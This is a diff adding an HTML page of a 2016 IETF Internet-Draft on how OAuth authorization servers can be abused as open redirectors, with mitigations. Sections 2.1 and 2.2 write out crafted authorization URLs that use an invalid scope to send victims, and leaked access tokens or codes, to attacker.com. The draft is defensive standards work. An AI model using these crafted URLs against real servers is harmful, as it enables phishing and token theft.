@@ -1,0 +1,589 @@
+<!DOCTYPE html>
+<!-- template: /a/www/ietf-datatracker/web/ietf/templates/doc/htmlized_base.html --><html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<title>
+  
+    draft-ietf-oauth-closing-redirectors-00
+  
+</title>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<style>
+
+  @media only screen 
+    and (min-width: 992px)
+    and (max-width: 1199px) {
+      body { font-size: 14pt; }
+            div.content { width: 96ex; margin: 0 auto; }
+        }
+  @media only screen 
+    and (min-width: 768px)
+    and (max-width: 991px) {
+            body { font-size: 14pt; }
+            div.content { width: 96ex; margin: 0 auto; }
+        }
+  @media only screen 
+    and (min-width: 480px)
+    and (max-width: 767px) {
+            body { font-size: 11pt; }
+            div.content { width: 96ex; margin: 0 auto; }
+        }
+  @media only screen 
+    and (max-width: 479px) {
+            body { font-size: 8pt; }
+            div.content { width: 96ex; margin: 0 auto; }
+        }
+  @media only screen 
+    and (min-device-width : 375px) 
+    and (max-device-width : 667px) {
+            body { font-size: 9.5pt; }
+            div.content { width: 96ex; margin: 0; }
+        }
+  @media only screen 
+    and (min-device-width: 1200px) {
+            body { font-size: 10pt; margin: 0 4em; }
+            div.content { width: 96ex; margin: 0; }
+        }
+        h1, h2, h3, h4, h5, h6, .h1, .h2, .h3, .h4, .h5, .h6 {
+      font-weight: bold;
+            /* line-height: 0pt; */
+            display: inline;
+            white-space: pre;
+            font-family: monospace;
+            font-size: 1em;
+      font-weight: bold;
+        }
+        pre {
+            font-size: 1em;
+            margin-top: 0px;
+            margin-bottom: 0px;
+        }
+  .pre {
+      white-space: pre;
+      font-family: monospace;
+  }
+  .header{
+      font-weight: bold;
+  }
+        .newpage {
+            page-break-before: always;
+        }
+        .invisible {
+            text-decoration: none;
+            color: white;
+        }
+        @media print {
+            body {
+                margin-top: 5em;
+                font-family: monospace;
+                font-size: 10.5pt;
+            }
+            h1, h2, h3, h4, h5, h6 {
+                font-size: 1em;
+            }
+        
+            a:link, a:visited {
+                color: inherit;
+                text-decoration: none;
+            }
+            .noprint {
+                display: none;
+            }
+        }
+  @media screen {
+      .grey, .grey a:link, .grey a:visited {
+    color: #777;
+      }
+            .meta-info {
+                background-color: #EEE;
+            }
+            .top {
+                border-top: 7px solid #EEE;
+            }
+            .pad {
+                padding-top: 7px;
+                line-height: 24px;
+                padding-bottom: 4px;
+            }
+            .bgwhite  { background-color: white; }
+            .bgred    { background-color: #F44; }
+            .bggrey   { background-color: #666; }
+            .bgbrown  { background-color: #840; }            
+            .bgorange { background-color: #FA0; }
+            .bgyellow { background-color: #EE0; }
+            .bgmagenta{ background-color: #F4F; }
+            .bgblue   { background-color: #66F; }
+            .bgcyan   { background-color: #4DD; }
+            .bggreen  { background-color: #4F4; }
+
+            .legend   { font-size: 90%; }
+            .cplate   { font-size: 70%; border: solid grey 1px; }
+  }
+    
+     
+
+.bgwhite  { background-color: white; }
+.bgred    { background-color: #F44; }
+.bggrey   { background-color: #666; }
+.bgbrown  { background-color: #840; }            
+.bgorange { background-color: #FA0; }
+.bgyellow { background-color: #EE0; }
+.bgmagenta{ background-color: #F4F; }
+.bgblue   { background-color: #66F; }
+.bgcyan   { background-color: #4DD; }
+.bggreen  { background-color: #4F4; }
+
+.draftcontent { margin-top:0px !important;}
+
+
+    </style>
+<!--[if lt IE 9]>
+        <script src="https://www.ietf.org/lib/dt/7.38.0/html5shiv/html5shiv.min.js"></script>
+        <script src="https://www.ietf.org/lib/dt/7.38.0/respond/dest/respond.min.js"></script>
+    <![endif]-->
+<link href="/feed/document-changes/draft-ietf-oauth-closing-redirectors/" rel="alternate" title="Document changes" type="application/atom+xml"/>
+<meta content="OAuth 2.0 Security: Closing Open Redirectors in OAuth (Internet-Draft, 2016)" name="description"/>
+<script src="https://www.ietf.org/lib/dt/7.38.0/d3/d3.min.js"></script>
+<script src="https://www.ietf.org/lib/dt/7.38.0/jquery/jquery.min.js"></script>
+<link href="https://www.ietf.org/lib/dt/7.38.0/ietf/images/ietf-icon-blue3.png" rel="shortcut icon"/>
+<link href="https://www.ietf.org/lib/dt/7.38.0/ietf/images/apple-touch-icon.png" rel="apple-touch-icon"/>
+</head>
+<body style="padding-top: 0;">
+<div class="content" id="content">
+<!-- template: /a/www/ietf-datatracker/web/ietf/templates/doc/document_html.html -->
+<div class="rfcmarkup">
+<div class="noprint" style="height: 6px;">
+<div class="meta-info bgred" onclick="showLegend();" onmouseout="hideLegend()" onmouseover="this.style.cursor='pointer';" style="height: 6px; min-height: 6px; width: 96ex; position: absolute; margin-top:0; " title="Click for colour legend."> </div>
+<div class="meta-info noprint pre legend" id="legend" onmouseout="hideLegend();" onmouseover="showLegend();" style="position:absolute; top: 4px; left: 4ex; visibility:hidden; background-color: white; padding: 4px 9px 5px 7px; border: solid #345 1px; ">
+</div>
+</div>
+<div class="noprint">
+<pre class="pre meta-info">[<a href="https://datatracker.ietf.org" title="Document search and retrieval page">Search</a>] [<a href="https://www.ietf.org/archive/id/draft-ietf-oauth-closing-redirectors-00.txt" title="Plaintext version of this document">txt</a>|<a href="https://www.ietf.org/archive/id/draft-ietf-oauth-closing-redirectors-00.xml" title="XML source for this document">xml</a>|<a href="https://tools.ietf.org/pdf/draft-ietf-oauth-closing-redirectors-00.pdf" title="PDF version of this document">pdf</a>|<a href="/doc/draft-ietf-oauth-closing-redirectors/00/bibtex" title="BibTex entry for this document">bibtex</a>] [<a href="/doc/draft-ietf-oauth-closing-redirectors/" title="Datatracker information for this document">Tracker</a>] [<a href="/group/oauth/" title="The working group handling this document">WG</a>] [<a href="mailto:draft-ietf-oauth-closing-redirectors@ietf.org?subject=draft-ietf-oauth-closing-redirectors" title="Send email to the document authors">Email</a>] [<a href="https://www.ietf.org/tools/idnits?url=https://www.ietf.org/archive/id/draft-ietf-oauth-closing-redirectors-00.txt" title="Run an idnits check of this document">Nits</a>]
+
+Versions: (<a href="/doc/html/draft-bradley-oauth-open-redirector">draft-bradley-oauth-open-redirector</a>)                         
+          <a href="/doc/html/draft-ietf-oauth-closing-redirectors-00"><b>00</b></a>                                                            </pre>
+</div>
+<div class="draftcontent">
+<pre>OAuth Working Group                                      J. Bradley, Ed.
+Internet-Draft                                             Ping Identity
+Intended status: Best Current Practice                          A. Sanso
+Expires: August 7, 2016                                    Adobe Systems
+                                                           H. Tschofenig
+                                                       February 04, 2016
+
+
+         <span class="h1">OAuth 2.0 Security: Closing Open Redirectors in OAuth</span>
+              <span class="h1">draft-ietf-oauth-closing-redirectors-00.txt</span>
+
+Abstract
+
+   This document gives additional security considerations for OAuth,
+   beyond those in the OAuth 2.0 specification and in the OAuth 2.0
+   Threat Model and Security Considerations.
+
+Status of This Memo
+
+   This Internet-Draft is submitted in full conformance with the
+   provisions of <a href="/doc/html/bcp78">BCP 78</a> and <a href="/doc/html/bcp79">BCP 79</a>.
+
+   Internet-Drafts are working documents of the Internet Engineering
+   Task Force (IETF).  Note that other groups may also distribute
+   working documents as Internet-Drafts.  The list of current Internet-
+   Drafts is at <a href="http://datatracker.ietf.org/drafts/current/">http://datatracker.ietf.org/drafts/current/</a>.
+
+   Internet-Drafts are draft documents valid for a maximum of six months
+   and may be updated, replaced, or obsoleted by other documents at any
+   time.  It is inappropriate to use Internet-Drafts as reference
+   material or to cite them other than as "work in progress."
+
+   This Internet-Draft will expire on August 7, 2016.
+
+Copyright Notice
+
+   Copyright (c) 2016 IETF Trust and the persons identified as the
+   document authors.  All rights reserved.
+
+   This document is subject to <a href="/doc/html/bcp78">BCP 78</a> and the IETF Trust's Legal
+   Provisions Relating to IETF Documents
+   (<a href="http://trustee.ietf.org/license-info">http://trustee.ietf.org/license-info</a>) in effect on the date of
+   publication of this document.  Please review these documents
+   carefully, as they describe your rights and restrictions with respect
+   to this document.  Code Components extracted from this document must
+   include Simplified BSD License text as described in Section 4.e of
+   the Trust Legal Provisions and are provided without warranty as
+   described in the Simplified BSD License.
+
+
+
+<span class="grey">Bradley, et al.          Expires August 7, 2016                 [Page 1]</span></pre>
+<hr class="noprint"/><!--NewPage--><pre class="newpage"><span id="page-2"></span>
+<span class="grey">Internet-Draft          OAuth Closing Redirectors          February 2016</span>
+
+
+Table of Contents
+
+   <a href="#section-1">1</a>.  Introduction  . . . . . . . . . . . . . . . . . . . . . . . .   <a href="#page-2">2</a>
+     <a href="#section-1.1">1.1</a>.  Notational Conventions  . . . . . . . . . . . . . . . . .   <a href="#page-2">2</a>
+     <a href="#section-1.2">1.2</a>.  Terminology . . . . . . . . . . . . . . . . . . . . . . .   <a href="#page-2">2</a>
+   <a href="#section-2">2</a>.  Authorization Server Error Response . . . . . . . . . . . . .   <a href="#page-3">3</a>
+     <a href="#section-2.1">2.1</a>.  Abuse: The Authorization Server As Open Redirector  . . .   <a href="#page-3">3</a>
+     2.2.  Security Compromise: The Authorization Server As Open
+           Redirector  . . . . . . . . . . . . . . . . . . . . . . .   <a href="#page-4">4</a>
+     <a href="#section-2.3">2.3</a>.  Mitigation  . . . . . . . . . . . . . . . . . . . . . . .   <a href="#page-5">5</a>
+   <a href="#section-3">3</a>.  Acknowledgements  . . . . . . . . . . . . . . . . . . . . . .   <a href="#page-6">6</a>
+   <a href="#section-4">4</a>.  Normative References  . . . . . . . . . . . . . . . . . . . .   <a href="#page-6">6</a>
+   <a href="#appendix-A">Appendix A</a>.  Document History . . . . . . . . . . . . . . . . . .   <a href="#page-6">6</a>
+   Authors' Addresses  . . . . . . . . . . . . . . . . . . . . . . .   <a href="#page-7">7</a>
+
+<span class="h2"><html><body><a class="dashAnchor" name="//apple_ref/cpp/Shortcut/1.%20%20Introduction"></a></body></html><a class="selflink" href="#section-1" id="section-1">1</a>.  Introduction</span>
+
+   This document gives additional security considerations for OAuth,
+   beyond those in the OAuth 2.0 specification [<a href="/doc/html/rfc6749" title='"The OAuth 2.0 Authorization Framework"'>RFC6749</a>] and in the
+   OAuth 2.0 Threat Model and Security Considerations [<a href="/doc/html/rfc6819" title='"OAuth 2.0 Threat Model and Security Considerations"'>RFC6819</a>].  In
+   particular focuses its attention on the risk of abuse the
+   Authorization Server (AS) (<a href="#section-1.2">Section 1.2</a>) as an open redirector.
+
+   It contains the following content:
+
+   o  Describes the Authorization Server Error Response as defined in
+      [<a href="/doc/html/rfc6749" title='"The OAuth 2.0 Authorization Framework"'>RFC6749</a>].
+   o  Describes the risk of abuse the Authorization Server as an open
+      redirector.
+   o  Gives some mitigation details on how to hinder the risk of open
+      redirector in the ?AS?.
+
+<span class="h3"><html><body><a class="dashAnchor" name="//apple_ref/cpp/Shortcut/1.1.%20%20Notational%20Conventions"></a></body></html><a class="selflink" href="#section-1.1" id="section-1.1">1.1</a>.  Notational Conventions</span>
+
+   The key words "<em>MUST</em>", "<em>MUST NOT</em>", "<em>REQUIRED</em>", "<em>SHALL</em>", "<em>SHALL NOT</em>",
+   "<em>SHOULD</em>", "<em>SHOULD NOT</em>", "<em>RECOMMENDED</em>", "<em>MAY</em>", and "<em>OPTIONAL</em>" in this
+   document are to be interpreted as described in <a href="/doc/html/rfc2119">RFC 2119</a> [<a href="/doc/html/rfc2119" title='"Key words for use in RFCs to Indicate Requirement Levels"'>RFC2119</a>].
+
+   Unless otherwise noted, all the protocol parameter names and values
+   are case sensitive.
+
+<span class="h3"><html><body><a class="dashAnchor" name="//apple_ref/cpp/Shortcut/1.2.%20%20Terminology"></a></body></html><a class="selflink" href="#section-1.2" id="section-1.2">1.2</a>.  Terminology</span>
+
+   Authorization Server (AS)
+      The server issuing access tokens to the client after successfully
+      authenticating the resource owner and obtaining authorization.
+
+   Redirection endpoint
+
+
+
+<span class="grey">Bradley, et al.          Expires August 7, 2016                 [Page 2]</span></pre>
+<hr class="noprint"/><!--NewPage--><pre class="newpage"><span id="page-3"></span>
+<span class="grey">Internet-Draft          OAuth Closing Redirectors          February 2016</span>
+
+
+      Used by the authorization server to return responses containing
+      authorization credentials to the client via the resource owner
+      user-agent.
+
+<span class="h2"><html><body><a class="dashAnchor" name="//apple_ref/cpp/Shortcut/2.%20%20Authorization%20Server%20Error%20Response"></a></body></html><a class="selflink" href="#section-2" id="section-2">2</a>.  Authorization Server Error Response</span>
+
+   The OAuth 2.0 specification [<a href="/doc/html/rfc6749" title='"The OAuth 2.0 Authorization Framework"'>RFC6749</a>] defines the Error Response
+   associated with the Authorization Code Grant flow and the Implicit
+   Grant flow.  Both flows use a redirection endpoint where the resource
+   owner's user agent is directed after the resource owner has completed
+   interacting with the authorization server.  The redirection endpoint
+   is also used in the error response scenario.  As per <a href="/doc/html/rfc6749#section-4.1.2.1">RFC6749
+   Section 4.1.2.1</a> and 4.2.2.1 [<a href="/doc/html/rfc6749" title='"The OAuth 2.0 Authorization Framework"'>RFC6749</a>] if the resource owner denies
+   the access request or if the request fails for reasons other than a
+   missing or invalid redirection URI, the ?AS? redirects the user-agent
+   by sending the following HTTP response:
+
+   HTTP/1.1 302 Found Location: https://client.example.com/
+   cb?error=access_denied
+
+<span class="h3"><html><body><a class="dashAnchor" name="//apple_ref/cpp/Shortcut/2.1.%20%20Abuse%3A%20The%20Authorization%20Server%20As%20Open%20Redirector"></a></body></html><a class="selflink" href="#section-2.1" id="section-2.1">2.1</a>.  Abuse: The Authorization Server As Open Redirector</span>
+
+   As described in [<a href="/doc/html/rfc6819" title='"OAuth 2.0 Threat Model and Security Considerations"'>RFC6819</a>] an attacker could utilize a user's trust in
+   an ?AS? to launch a phishing attack.  The attack described here
+   though is not mitigated using the countermeasures listed in
+   [<a href="/doc/html/rfc6819" title='"OAuth 2.0 Threat Model and Security Considerations"'>RFC6819</a>].  In this scenario the attacker:
+
+   o  Performs a client registration as per the core specification
+      [<a href="/doc/html/rfc6749" title='"The OAuth 2.0 Authorization Framework"'>RFC6749</a>].  The provided redirection URI is a malicious one e.g.
+      <a href="https://attacker.com">https://attacker.com</a> (namely the one where the victim's user agent
+      will land without any validation)
+
+
+   o  Prepare a forged URI using the assumption that the ?AS? complies
+      with the OAuth 2.0 specification [<a href="/doc/html/rfc6749" title='"The OAuth 2.0 Authorization Framework"'>RFC6749</a>].  In particular with
+      the ?AS?  Error Response described in the previous section (
+      <a href="#section-2">Section 2</a> ).  As an example he can use a wrong or not existing
+      scope e.g.
+
+      https://AUTHORIZATION_SERVER/authorize?response_type=code&amp;client_i
+      d=s6BhdRkqt3&amp;state=xyz&amp;redirect_uri=https%3A%2F%2Fattacker%2Ecom&amp;s
+      cope=INVALID_SCOPE
+
+
+   o  Attempt the pishing attack trying to have the victim clicking the
+      forged URI prepared on the previous step.  Should the attack
+      succeeds the victim's user agent is redirected to
+      <a href="https://attacker.com">https://attacker.com</a> (all with any user interaction) The HTTP
+
+
+
+<span class="grey">Bradley, et al.          Expires August 7, 2016                 [Page 3]</span></pre>
+<hr class="noprint"/><!--NewPage--><pre class="newpage"><span id="page-4"></span>
+<span class="grey">Internet-Draft          OAuth Closing Redirectors          February 2016</span>
+
+
+      referer header will be set to the AS domain perhaps allowing
+      manipulation of the user.
+
+<span class="h3"><html><body><a class="dashAnchor" name="//apple_ref/cpp/Shortcut/2.2.%20%20Security%20Compromise%3A%20The%20Authorization%20Server%20As%20Open%20Redirector"></a></body></html><a class="selflink" href="#section-2.2" id="section-2.2">2.2</a>.  Security Compromise: The Authorization Server As Open Redirector</span>
+
+   The attacker can use a redirect error redirection to intercept
+   redirect based protocol messages via the Referer header and URI
+   fragment.  In this scenario the attacker:
+
+   o  Performs a registration of a malicious client as per the core
+      specification [<a href="/doc/html/rfc6749" title='"The OAuth 2.0 Authorization Framework"'>RFC6749</a>].  The provided redirection URI is a
+      malicious one e.g.  <a href="https://attacker.com">https://attacker.com</a> (This URI will capture
+      the fragment and referer header sent as part of the error)
+
+
+   o  Creates a invalid Authentication request URI for the malicious
+      client.  As an example he can use a wrong or not existing scope
+      e.g.
+
+      https://AUTHORIZATION_SERVER/authorize?response_type=code&amp;client_i
+      d=malicious_client&amp;redirect_uri=https%3A%2F%2Fattacker%2Ecom&amp;scope
+      =INVALID_SCOPE
+
+
+   o  If the AS supports sticky grants (not re-prompting for consent
+      based on a previous grant) a valid authentication request for the
+      user may also be used to trigger a 30x redirect.
+
+
+   o  Performs a OAuth Authorization request using the invalid
+      Authorization request as the redirect_uri.  This works if the AS
+      is pattern matching redirect_uri and has a public client that
+      shares the same domain as the AS.
+
+   (line breaks for display only)
+
+   <a href="https://AUTHORIZATION_SERVER/authorize?response_type=token">https://AUTHORIZATION_SERVER/authorize?response_type=token</a>
+   &amp;client_id=good-client&amp;scope=VALID_SCOPE
+   &amp;redirect_uri=https%3A%2F%2AUTHORIZATION_SERVER%Fauthorize
+   %3Fresponse_type%3Dcode
+   %26client_id%3Dattacker-client-id
+   %26scope%3DINVALID_SCOPE
+   %26redirect_uri%3Dhttps%253A%252F%252Fattacker.com
+
+                                 Figure 1
+
+   o  Receive the response redirected to <a href="https://attacker.Com">https://attacker.Com</a>
+
+
+
+
+<span class="grey">Bradley, et al.          Expires August 7, 2016                 [Page 4]</span></pre>
+<hr class="noprint"/><!--NewPage--><pre class="newpage"><span id="page-5"></span>
+<span class="grey">Internet-Draft          OAuth Closing Redirectors          February 2016</span>
+
+
+   The legitimate OAuth Authorization response will include an access
+   token in the URI fragment.
+
+   Most web browsers will append the fragment to the URI sent in the
+   location header of a 302 response if no fragment is included in the
+   location URI.
+
+   If the Authorization request is code instead of token, the same
+   technique is used, but the code is leaked by the browser in the
+   referer header rather than the fragment.
+
+   This causes the access token from a successful authorization to be
+   leaked across the redirect to the malicious client.  This is due to
+   browser behaviour and not because the AS has included any information
+   in the redirect URI other than the error code.
+
+   Protocols other than OAuth may be particularly vulnerable to this if
+   they are only verifying the domain of the redirect.  Performing exact
+   redirect URI matching in OAuth will protect the AS, but not other
+   protocols.
+
+   It should be noted that a legitimate OAuth client registered with a
+   AS might be compromised and used as a redirect target by an attacker,
+   perhaps without the knowledge of the client site.  This increases a
+   the attack surface for a ?AS?.
+
+<span class="h3"><html><body><a class="dashAnchor" name="//apple_ref/cpp/Shortcut/2.3.%20%20Mitigation"></a></body></html><a class="selflink" href="#section-2.3" id="section-2.3">2.3</a>.  Mitigation</span>
+
+   In order to defend against the attacks described in <a href="#section-2.1">Section 2.1</a> and
+   <a href="#section-2.2">Section 2.2</a> the ?AS? can either:
+
+   o  Respond with an HTTP 400 (Bad Request) status code.
+
+
+   o  Perform a redirect to an intermediate URI under the control of the
+      AS to clear referer information in the browser that may contain
+      security token information.  This page <em>SHOULD</em> provide notice to
+      the resource owner that an error occurred, and request permission
+      to redirect them to an external site.
+
+      If redirected, a fragment "#" <em>MUST</em> be appended to the error
+      redirect URI.  This prevents the browser from reattaching the
+      fragment from a previous URI to the new location URI.
+
+      Some
+
+   When redirecting via 30x a Content Security Policy header <em>SHOULD</em> be
+   added:
+
+
+
+<span class="grey">Bradley, et al.          Expires August 7, 2016                 [Page 5]</span></pre>
+<hr class="noprint"/><!--NewPage--><pre class="newpage"><span id="page-6"></span>
+<span class="grey">Internet-Draft          OAuth Closing Redirectors          February 2016</span>
+
+
+   Content-Security-Policy: referrer origin;
+
+                                 Figure 2
+
+   When redirecting via a form post the following tag <em>SHOULD</em> be
+   included:
+
+   &lt;meta name="referrer" content="origin"/&gt;
+
+                                 Figure 3
+
+   Only newer browsers support these headders, so users with older
+   browsers will be vulnerable to leaking referer information unless a
+   intermediate redirect is used.s
+
+<span class="h2"><html><body><a class="dashAnchor" name="//apple_ref/cpp/Shortcut/3.%20%20Acknowledgements"></a></body></html><a class="selflink" href="#section-3" id="section-3">3</a>.  Acknowledgements</span>
+
+   We would like to thank all the people that partecipated to the
+   discussion, namely Bill Burke, Hans Zandbelt, Justin P.  Richer, Phil
+   Hunt, Takahiko Kawasaki, Torsten Lodderstedt, Sergey Beryozkin.
+
+<span class="h2"><html><body><a class="dashAnchor" name="//apple_ref/cpp/Shortcut/4.%20%20Normative%20References"></a></body></html><a class="selflink" href="#section-4" id="section-4">4</a>.  Normative References</span>
+
+   [<a id="ref-RFC2119">RFC2119</a>]  Bradner, S., "Key words for use in RFCs to Indicate
+              Requirement Levels", <a href="/doc/html/bcp14">BCP 14</a>, <a href="/doc/html/rfc2119">RFC 2119</a>,
+              DOI 10.17487/RFC2119, March 1997,
+              &lt;<a href="http://www.rfc-editor.org/info/rfc2119">http://www.rfc-editor.org/info/rfc2119</a>&gt;.
+
+   [<a id="ref-RFC6749">RFC6749</a>]  Hardt, D., Ed., "The OAuth 2.0 Authorization Framework",
+              <a href="/doc/html/rfc6749">RFC 6749</a>, DOI 10.17487/RFC6749, October 2012,
+              &lt;<a href="http://www.rfc-editor.org/info/rfc6749">http://www.rfc-editor.org/info/rfc6749</a>&gt;.
+
+   [<a id="ref-RFC6819">RFC6819</a>]  Lodderstedt, T., Ed., McGloin, M., and P. Hunt, "OAuth 2.0
+              Threat Model and Security Considerations", <a href="/doc/html/rfc6819">RFC 6819</a>,
+              DOI 10.17487/RFC6819, January 2013,
+              &lt;<a href="http://www.rfc-editor.org/info/rfc6819">http://www.rfc-editor.org/info/rfc6819</a>&gt;.
+
+<span class="h2"><html><body><a class="dashAnchor" name="//apple_ref/cpp/Shortcut/Appendix%20A.%20%20Document%20History"></a></body></html><a class="selflink" href="#appendix-A" id="appendix-A">Appendix A</a>.  Document History</span>
+
+   [[ to be removed by the RFC Editor before publication as an RFC ]]
+
+   -01
+
+   o  Added information on HTTP headders to include to set referrer to
+      origin
+
+   -00
+
+
+
+
+<span class="grey">Bradley, et al.          Expires August 7, 2016                 [Page 6]</span></pre>
+<hr class="noprint"/><!--NewPage--><pre class="newpage"><span id="page-7"></span>
+<span class="grey">Internet-Draft          OAuth Closing Redirectors          February 2016</span>
+
+
+   o  Wrote the first draft.
+
+   o  Changed Document name to conform to WG naming convention
+
+   o  Added Section on redirect leaking security information
+
+   o  Added Terminology section
+
+   o  fixed file name
+
+   o  cleaned up mitigations a bit
+
+Authors' Addresses
+
+   John Bradley (editor)
+   Ping Identity
+
+   Phone: +1 202-630-5272
+   Email: ve7jtb@ve7jtb.com
+   URI:   <a href="http://www.thread-safe.com/">http://www.thread-safe.com/</a>
+
+
+   Antonio Sanso
+   Adobe Systems
+
+   Email: asanso@adobe.com
+
+
+   Hannes Tschofenig
+
+   Email: Hannes.Tschofenig@gmx.net
+   URI:   <a href="http://www.tschofenig.priv.at">http://www.tschofenig.priv.at</a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Bradley, et al.          Expires August 7, 2016                 [Page 7]
+</pre>
+</div>
+</div>
+</div>
+<script>$(".visible-nojs").removeClass("visible-nojs");</script>
+<script>$(".hidden-nojs").removeClass("hidden-nojs");</script>
+<script type="text/javascript"><!--
+    var legend_html = "Colour legend:<br /> \
+     <table> \
+        <tr><td>Unknown:</td>                   <td><span class='cplate bgwhite'>&nbsp;&nbsp;&nbsp;&nbsp;</span></td></tr> \
+        <tr><td>Draft:</td>                     <td><span class='cplate bgred'>&nbsp;&nbsp;&nbsp;&nbsp;</span></td></tr> \
+        <tr><td>Informational:</td>             <td><span class='cplate bgorange'>&nbsp;&nbsp;&nbsp;&nbsp;</span></td></tr> \
+        <tr><td>Experimental:</td>              <td><span class='cplate bgyellow'>&nbsp;&nbsp;&nbsp;&nbsp;</span></td></tr> \
+        <tr><td>Best Common Practice:</td>      <td><span class='cplate bgmagenta'>&nbsp;&nbsp;&nbsp;&nbsp;</span></td></tr> \
+        <tr><td>Proposed Standard:</td>         <td><span class='cplate bgblue'>&nbsp;&nbsp;&nbsp;&nbsp;</span></td></tr> \
+        <tr><td>Draft Standard (old designation):</td> <td><span class='cplate bgcyan'>&nbsp;&nbsp;&nbsp;&nbsp;</span></td></tr> \
+        <tr><td>Internet Standard:</td>         <td><span class='cplate bggreen'>&nbsp;&nbsp;&nbsp;&nbsp;</span></td></tr> \
+        <tr><td>Historic:</td>                  <td><span class='cplate bggrey'>&nbsp;&nbsp;&nbsp;&nbsp;</span></td></tr> \
+        <tr><td>Obsolete:</td>                  <td><span class='cplate bgbrown'>&nbsp;&nbsp;&nbsp;&nbsp;</span></td></tr> \
+    </table>";
+    function showLegend() {
+        var elem = document.getElementById('legend');
+        elem.innerHTML = legend_html
+        elem.style.visibility='visible';
+    }
+    function hideLegend() {
+        var elem = document.getElementById('legend');
+        elem.style.visibility='hidden';
+        elem.innerHTML = "";
+    }
+    // -->
+    </script>
+</body>
+</html>
